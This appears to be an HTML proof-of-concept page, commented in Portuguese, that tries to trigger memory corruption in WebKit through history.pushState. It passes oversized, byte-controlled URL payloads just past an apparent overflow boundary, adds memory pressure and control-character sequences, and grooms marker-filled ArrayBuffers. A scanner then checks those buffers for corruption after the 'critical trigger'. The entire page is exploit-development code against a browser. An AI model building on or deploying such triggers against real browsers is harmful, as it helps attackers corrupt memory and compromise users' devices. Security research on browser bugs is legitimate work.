
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>WebKit History.pushState – 6-3-1 ORIGINAL + Scanner</title>
</head>
<body>

<button onclick="run631()">Executar Teste 6-3-1 Original</button>
<button onclick="clearLog()">Limpar Log</button>
<pre id="log"></pre>

<script>
// =====================================================
// CONSTANTES ORIGINAIS
// =====================================================
const BASE_SAFE = 709522;
const OVERFLOW_AT = 709523;
const MAX_BYTE = 0x20;

// =====================================================
// LOG
// =====================================================
function log(m) {
  const l = document.getElementById("log");
  l.textContent += m + "\n";
}
function clearLog() { document.getElementById("log").textContent = ""; }

// =====================================================
// FUNÇÕES AUXILIARES ORIGINAIS (PRESERVADAS)
// =====================================================

// Pressão de quota progressiva
function quotaPressure() {
  let tmp = [];
  for (let i = 0; i < 200; i++) {
    tmp.push("Q".repeat(4096));
  }
  return tmp;
}

// Micro yield — NÃO É sleep longo
function microYield() {
  const start = performance.now();
  while (performance.now() - start < 0.3) {}
}

// Construção de payload byte-controlado
function buildPayload(extraLen) {
  let s = "";
  for (let i = 0; i < extraLen; i++) {
    s += String.fromCharCode(i % (MAX_BYTE + 1));
  }
  return "/" + "A".repeat(BASE_SAFE) + s;
}

// =====================================================
// TESTE 6 — PRÉ-CONDIÇÃO
// =====================================================
function test6() {
  log("[6] Pressão incremental");
  history.pushState({}, "", buildPayload(12000));
  microYield();
}

// =====================================================
// TESTE 3 — INSTABILIDADE
// =====================================================
function test3() {
  log("[3] Sequência de controle");
  let seq = "";
  const b = [0x00,0x09,0x0A,0x0D,0x20];
  for (let i = 0; i < 2000; i++) {
    for (let x of b) seq += String.fromCharCode(x);
  }
  history.pushState({}, "", "/" + "A".repeat(BASE_SAFE) + seq);
  microYield();
}

// =====================================================
// TESTE 1 — DISPARO CRÍTICO (INALTERADO)
// =====================================================
function test1() {
  log("[1] Payload crítico");
  history.pushState({}, "", buildPayload(64));
}

// =====================================================
// ====== TESTE 9 — SCANNER PASSIVO (NOVO) ======
// =====================================================
let targets = [];

function prepareTargets() {
  targets = [];
  for (let i = 0; i < 40; i++) {
    let buf = new ArrayBuffer(1024);
    let view = new Uint32Array(buf);
    view.fill(0xDEADBEEF);
    targets.push({ view, magic: 0xCAFEBABE });
  }
}

function snapshot() {
  return targets.map(t => ({
    magic: t.magic,
    v0: t.view[0],
    v1: t.view[1]
  }));
}

function scan(pre, post) {
  let hits = 0;
  for (let i = 0; i < pre.length; i++) {
    if (pre[i].v0 !== post[i].v0 ||
        pre[i].v1 !== post[i].v1 ||
        pre[i].magic !== post[i].magic) {
      log("CORRUPÇÃO alvo " + i);
      hits++;
    }
  }
  if (hits === 0) log("Scanner: nenhuma alteração");
  else log("Scanner: " + hits + " alvos alterados");
}

// =====================================================
// EXECUÇÃO 6-3-1 + OBSERVAÇÃO
// =====================================================
function run631() {
  log("==== INÍCIO 6-3-1 ORIGINAL ====");
  prepareTargets();

  test6();
  test3();

  const pre = snapshot();
  test1();          // DISPARO REAL
  const post = snapshot();

  scan(pre, post);

  log("==== FIM ====");
}
</script>

</body>
</html>
